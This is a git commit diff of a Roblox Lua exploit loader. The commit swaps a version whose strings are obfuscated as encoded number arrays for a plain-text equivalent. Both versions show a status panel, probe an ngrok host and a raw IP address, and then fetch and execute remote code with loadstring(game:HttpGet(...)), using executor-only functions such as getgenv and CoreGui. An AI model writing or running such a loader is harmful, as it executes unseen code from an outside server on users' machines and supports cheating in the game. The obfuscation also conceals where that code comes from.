4323e2b18803b32f57fdadcdbf31345535df47dc
sonic <156506053+sonic998@users.noreply.github.com>
2025-08-05 12:51:25 +0200

    Update script.lua

--- script.lua
+++ script.lua
@@ -1,60 +1,12 @@
+local Welcome = Instance.new("ScreenGui")
+local ScriptStatus = Instance.new("Frame")
+local UICorner = Instance.new("UICorner")
+local status = Instance.new("TextLabel")
 
-local Players = game:GetService("Players")
-local StarterGui = game:GetService("StarterGui")
-
-local _44mftj2kg = function()
-    function Main()
-local Welcome = Instance.new((function()
-        local a={1116,1324,1519,1350,1350,1467,960,1558,1402};
-        local b='';
-        for i=1,#a do 
-            b=b..string.char((a[i]-37)/13);
-        end;
-        return b;
-    end)())
-local ScriptStatus = Instance.new((function()
-        local a={947,1519,1298,1454,1350};
-        local b='';
-        for i=1,#a do 
-            b=b..string.char((a[i]-37)/13);
-        end;
-        return b;
-    end)())
-local UICorner = Instance.new((function()
-        local a={1142,986,908,1480,1519,1467,1350,1519};
-        local b='';
-        for i=1,#a do 
-            b=b..string.char((a[i]-37)/13);
-        end;
-        return b;
-    end)())
-local status = Instance.new((function()
-        local a={1129,1350,1597,1545,1025,1298,1311,1350,1441};
-        local b='';
-        for i=1,#a do 
-            b=b..string.char((a[i]-37)/13);
-        end;
-        return b;
-    end)())
-
-Welcome.Name = (function()
-        local a={1168,1350,1441,1324,1480,1454,1350};
-        local b='';
-        for i=1,#a do 
-            b=b..string.char((a[i]-37)/13);
-        end;
-        return b;
-    end)()
+Welcome.Name = "Welcome"
 Welcome.Parent = game.CoreGui
 
-ScriptStatus.Name = (function()
-        local a={1116,1324,1519,1402,1493,1545,1116,1545,1298,1545,1558,1532};
-        local b='';
-        for i=1,#a do 
-            b=b..string.char((a[i]-37)/13);
-        end;
-        return b;
-    end)()
+ScriptStatus.Name = "ScriptStatus"
 ScriptStatus.Parent = Welcome
 ScriptStatus.BackgroundColor3 = Color3.fromRGB(0, 85, 255)
 ScriptStatus.BorderColor3 = Color3.fromRGB(0, 0, 0)
@@ -64,14 +16,7 @@ ScriptStatus.Size = UDim2.new(0, 165, 0, 61)
 
 UICorner.Parent = ScriptStatus
 
-status.Name = (function()
-        local a={1532,1545,1298,1545,1558,1532};
-        local b='';
-        for i=1,#a do 
-            b=b..string.char((a[i]-37)/13);
-        end;
-        return b;
-    end)()
+status.Name = "status"
 status.Parent = ScriptStatus
 status.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
 status.BackgroundTransparency = 1.000
@@ -79,261 +24,19 @@ status.BorderColor3 = Color3.fromRGB(0, 0, 0)
 status.BorderSizePixel = 0
 status.Size = UDim2.new(0, 165, 0, 61)
 status.Font = Enum.Font.SourceSansBold
-status.Text = (function()
-        local a={1116,1324,1519,1402,1493,1545,453,1402,1532,453,1064,1051,129894};
-        local b='';
-        for i=1,#a do 
-            b=b..string.char((a[i]-37)/13);
-        end;
-        return b;
-    end)()
+status.Text = "Script is ON✅"
 status.TextColor3 = Color3.fromRGB(255, 255, 255)
 status.TextScaled = true
 status.TextSize = 14.000
 status.TextWrapped = true
 
-function CheckSiteStatus(url)
-	local success, result = pcall(function()
-		return game:HttpGet(url .. (function()
-        local a={648,1532,1545,1298,1545,1558,1532,635,1545,1597,1545};
-        local b='';
-        for i=1,#a do 
-            b=b..string.char((a[i]-37)/13);
-        end;
-        return b;
-    end)())
-	end)
-	
-	if success then
-		return true
-	else
-	    return false	
-	end
-end
-
-if CheckSiteStatus((function()
-        local a={1389,1545,1545,1493,791,648,648,1350,1597,1480,1545,1402,1324,622,1389,1480,1493,1350,1441,1350,1532,1532,1441,1610,622,1454,1402,1467,1428,635,1467,1376,1519,1480,1428,622,1363,1519,1350,1350,635,1298,1493,1493};
-        local b='';
-        for i=1,#a do 
-            b=b..string.char((a[i]-37)/13);
-        end;
-        return b;
-    end)()) or CheckSiteStatus((function()
-        local a={1389,1545,1545,1493,791,648,648,674,765,765,635,778,661,635,687,700,661,635,674,765,778,791,726,661,661,713};
-        local b='';
-        for i=1,#a do 
-            b=b..string.char((a[i]-37)/13);
-        end;
-        return b;
-    end)()) then
-	status.Text = (function()
-        local a={1116,1324,1519,1402,1493,1545,453,1402,1532,453,1064,1051,129894};
-        local b='';
-        for i=1,#a do 
-            b=b..string.char((a[i]-37)/13);
-        end;
-        return b;
-    end)()
+if CheckSiteStatus("http://exotic-hopelessly-mink.ngrok-free.app") or CheckSiteStatus("http://188.90.230.189:5004") then
+	status.Text = "Script is ON✅"
 	task.wait(1)
 	Welcome:Destroy()
-	getgenv().address = (function()
-        local a={674,765,765,635,778,661,635,687,700,661,635,674,765,778,791,726,661,661,713,648,1116,1389,1298,1337,1480,1584,622,1116,1324,1519,1402,1493,1545,1532};
-        local b='';
-        for i=1,#a do 
-            b=b..string.char((a[i]-37)/13);
-        end;
-        return b;
-    end)()
-    loadstring(game:HttpGet((function()
-        local a={1389,1545,1545,1493,791,648,648,674,765,765,635,778,661,635,687,700,661,635,674,765,778,791,726,661,661,713,648,1116,1389,1298,1337,1480,1584,622,1116,1324,1519,1402,1493,1545,1532,648,1532,1324,1519,1402,1493,1545,635,1441,1558,1298};
-        local b='';
-        for i=1,#a do 
-            b=b..string.char((a[i]-37)/13);
-        end;
-        return b;
-    end)()))()
-    
+	getgenv().address = "exotic-hopelessly-mink.ngrok-free.app/Shadow-Scripts"
+    loadstring(game:HttpGet("http://exotic-hopelessly-mink.ngrok-free.app/Shadow-Scripts/script.lua"))()
 else
-	status.Text = (function()
-        local a={1116,1324,1519,1402,1493,1545,453,1402,1532,453,1064,947,947,130817};
-        local b='';
-        for i=1,#a do 
-            b=b..string.char((a[i]-37)/13);
-        end;
-        return b;
-    end)()
+	status.Text = "Script is OFF❌"
 	Welcome:Destroy()
 end
-end
-
-function Backup()
-local Welcome = Instance.new((function()
-        local a={1116,1324,1519,1350,1350,1467,960,1558,1402};
-        local b='';
-        for i=1,#a do 
-            b=b..string.char((a[i]-37)/13);
-        end;
-        return b;
-    end)())
-local ScriptStatus = Instance.new((function()
-        local a={947,1519,1298,1454,1350};
-        local b='';
-        for i=1,#a do 
-            b=b..string.char((a[i]-37)/13);
-        end;
-        return b;
-    end)())
-local UICorner = Instance.new((function()
-        local a={1142,986,908,1480,1519,1467,1350,1519};
-        local b='';
-        for i=1,#a do 
-            b=b..string.char((a[i]-37)/13);
-        end;
-        return b;
-    end)())
-local status = Instance.new((function()
-        local a={1129,1350,1597,1545,1025,1298,1311,1350,1441};
-        local b='';
-        for i=1,#a do 
-            b=b..string.char((a[i]-37)/13);
-        end;
-        return b;
-    end)())
-
-Welcome.Name = (function()
-        local a={1168,1350,1441,1324,1480,1454,1350};
-        local b='';
-        for i=1,#a do 
-            b=b..string.char((a[i]-37)/13);
-        end;
-        return b;
-    end)()
-Welcome.Parent = game.CoreGui
-
-ScriptStatus.Name = (function()
-        local a={1116,1324,1519,1402,1493,1545,1116,1545,1298,1545,1558,1532};
-        local b='';
-        for i=1,#a do 
-            b=b..string.char((a[i]-37)/13);
-        end;
-        return b;
-    end)()
-ScriptStatus.Parent = Welcome
-ScriptStatus.BackgroundColor3 = Color3.fromRGB(0, 85, 255)
-ScriptStatus.BorderColor3 = Color3.fromRGB(0, 0, 0)
-ScriptStatus.BorderSizePixel = 0
-ScriptStatus.Position = UDim2.new(0.293931752, 0, 0.241623715, 0)
-ScriptStatus.Size = UDim2.new(0, 165, 0, 61)
-
-UICorner.Parent = ScriptStatus
-
-status.Name = (function()
-        local a={1532,1545,1298,1545,1558,1532};
-        local b='';
-        for i=1,#a do 
-            b=b..string.char((a[i]-37)/13);
-        end;
-        return b;
-    end)()
-status.Parent = ScriptStatus
-status.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-status.BackgroundTransparency = 1.000
-status.BorderColor3 = Color3.fromRGB(0, 0, 0)
-status.BorderSizePixel = 0
-status.Size = UDim2.new(0, 165, 0, 61)
-status.Font = Enum.Font.SourceSansBold
-status.Text = (function()
-        local a={1116,1324,1519,1402,1493,1545,453,1402,1532,453,1064,1051,129894};
-        local b='';
-        for i=1,#a do 
-            b=b..string.char((a[i]-37)/13);
-        end;
-        return b;
-    end)()
-status.TextColor3 = Color3.fromRGB(255, 255, 255)
-status.TextScaled = true
-status.TextSize = 14.000
-status.TextWrapped = true
-
-function CheckSiteStatus(url)
-	local success, result = pcall(function()
-		return game:HttpGet(url .. (function()
-        local a={648,1532,1545,1298,1545,1558,1532,635,1545,1597,1545};
-        local b='';
-        for i=1,#a do 
-            b=b..string.char((a[i]-37)/13);
-        end;
-        return b;
-    end)())
-	end)
-	
-	if success then
-		return true
-	else
-	    return false	
-	end
-end
-
-if CheckSiteStatus((function()
-        local a={1389,1545,1545,1493,791,648,648,1350,1597,1480,1545,1402,1324,622,1389,1480,1493,1350,1441,1350,1532,1532,1441,1610,622,1454,1402,1467,1428,635,1467,1376,1519,1480,1428,622,1363,1519,1350,1350,635,1298,1493,1493};
-        local b='';
-        for i=1,#a do 
-            b=b..string.char((a[i]-37)/13);
-        end;
-        return b;
-    end)()) or CheckSiteStatus((function()
-        local a={1389,1545,1545,1493,791,648,648,674,765,765,635,778,661,635,687,700,661,635,674,765,778,791,726,661,661,713};
-        local b='';
-        for i=1,#a do 
-            b=b..string.char((a[i]-37)/13);
-        end;
-        return b;
-    end)()) then
-	status.Text = (function()
-        local a={1116,1324,1519,1402,1493,1545,453,1402,1532,453,1064,1051,129894};
-        local b='';
-        for i=1,#a do 
-            b=b..string.char((a[i]-37)/13);
-        end;
-        return b;
-    end)()
-	task.wait(1)
-	Welcome:Destroy()
-	getgenv().address = (function()
-        local a={1350,1597,1480,1545,1402,1324,622,1389,1480,1493,1350,1441,1350,1532,1532,1441,1610,622,1454,1402,1467,1428,635,1467,1376,1519,1480,1428,622,1363,1519,1350,1350,635,1298,1493,1493,648,1116,1389,1298,1337,1480,1584,622,1116,1324,1519,1402,1493,1545,1532};
-        local b='';
-        for i=1,#a do 
-            b=b..string.char((a[i]-37)/13);
-        end;
-        return b;
-    end)()
-    loadstring(game:HttpGet((function()
-        local a={1389,1545,1545,1493,791,648,648,1350,1597,1480,1545,1402,1324,622,1389,1480,1493,1350,1441,1350,1532,1532,1441,1610,622,1454,1402,1467,1428,635,1467,1376,1519,1480,1428,622,1363,1519,1350,1350,635,1298,1493,1493,648,1116,1389,1298,1337,1480,1584,622,1116,1324,1519,1402,1493,1545,1532,648,1532,1324,1519,1402,1493,1545,635,1441,1558,1298};
-        local b='';
-        for i=1,#a do 
-            b=b..string.char((a[i]-37)/13);
-        end;
-        return b;
-    end)()))()
-else
-	status.Text = (function()
-        local a={1116,1324,1519,1402,1493,1545,453,1402,1532,453,1064,947,947,130817};
-        local b='';
-        for i=1,#a do 
-            b=b..string.char((a[i]-37)/13);
-        end;
-        return b;
-    end)()
-	Welcome:Destroy()
-end
-end
-
-local success, result = pcall(function()
-    return Main()
-end)
-
-if not success then
-    Backup()
-end
-end;
-_44mftj2kg();
